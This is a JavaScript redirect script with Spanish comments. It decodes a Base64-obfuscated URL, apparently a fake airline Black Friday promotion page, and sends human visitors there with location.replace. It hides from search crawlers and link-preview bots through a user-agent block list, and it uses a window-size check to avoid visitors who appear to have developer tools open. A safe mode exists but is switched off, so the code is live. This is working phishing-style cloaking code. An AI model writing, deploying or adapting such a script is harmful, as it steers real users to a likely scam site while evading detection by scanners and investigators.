// Redirección protegida — MÓVILES + ESCRITORIOS, NUNCA BOTS
(function () {
  'use strict';

  // --- Configuración ---
  const BOT_REGEX = /bot|crawler|spider|crawl|slurp|bingpreview|fetch|facebookexternalhit|facebot|googlebot|adsbot|bingbot|yandexbot|baiduspider|duckduckbot|ia_archiver/i;
  const MOBILE_REGEX = /Mobi|Android|iPhone|iPad|iPod/i;           // detecta móviles/tablets
  const DESKTOP_MARKERS = /Windows NT|Macintosh|X11|CrOS|Linux/i; // marcadores típicos de escritorio
  const SIZE_DIFF_THRESHOLD = 160;                                // umbral heurístico outer - inner
  const ENCODED_TARGET = "aHR0cHM6Ly9hdmlhbmNhcHJvbW9ibGFja2ZyaWRheS5henVyZXdlYnNpdGVzLm5ldC9ibGFja2ZyaWRheS8="; // Base64 original

  // safeMode = true => no redirige, solo muestra en consola. Cambia a false para activar.
  const safeMode = false;

  // --- Utilidades ---
  function decodeBase64(str) {
    return atob(str);
  }

  function cleanString(s) {
    if (typeof s !== 'string') return s;
    // eliminar caracteres de control, marcas blandas y espacios invisibles
    return s.replace(/[\u0000-\u001F\u007F-\u009F\u00AD]/g, '').replace(/\s+/g, '');
  }

  function looksLikeUrl(s) {
    return typeof s === 'string' && /^https?:\/\//i.test(s);
  }

  function sizeDifferenceOk() {
    const widthDiff = Math.abs(window.outerWidth - window.innerWidth);
    const heightDiff = Math.abs(window.outerHeight - window.innerHeight);
    return !(widthDiff > SIZE_DIFF_THRESHOLD || heightDiff > SIZE_DIFF_THRESHOLD);
  }

  function isBot(ua) {
    return BOT_REGEX.test(ua);
  }

  function isMobile(ua) {
    return MOBILE_REGEX.test(ua);
  }

  function isDesktop(ua) {
    // Consideramos escritorio si detectamos marcadores de desktop y NO es mobile por UA
    return DESKTOP_MARKERS.test(ua) && !isMobile(ua);
  }

  // --- Lógica principal ---
  try {
    const ua = navigator.userAgent || '';

    // Decodificar y limpiar la URL objetivo
    const decodedRaw = decodeBase64(ENCODED_TARGET);
    const decoded = cleanString(decodedRaw);

    console.group('Redirección protegida — inspección');
    console.log('navigator.userAgent:', ua);
    console.log('Decoded (raw):', decodedRaw);
    console.log('Decoded (cleaned):', decoded);
    console.log('isBot:', isBot(ua));
    console.log('isMobile:', isMobile(ua));
    console.log('isDesktop:', isDesktop(ua));
    console.log('sizeDifferenceOk:', sizeDifferenceOk());
    console.groupEnd();

    // Regla: NO redirigir a bots. SÍ redirigir a móviles o escritorios (ambos) y si sizeDiff OK.
    const shouldRedirect = !isBot(ua) && (isMobile(ua) || isDesktop(ua)) && sizeDifferenceOk();

    if (!safeMode && shouldRedirect) {
      if (looksLikeUrl(decoded)) {
        // Reemplazar la ubicación (no deja entrada en historial)
        location.replace(decoded);
      } else {
        console.warn('La URL decodificada no tiene formato http(s). No se redirige.', decoded);
      }
    } else {
      console.log('No se realizará redirección automática. shouldRedirect=%s, safeMode=%s', shouldRedirect, safeMode);
    }

  } catch (err) {
    console.error('Error en redirección protegida:', err);
  }

})();
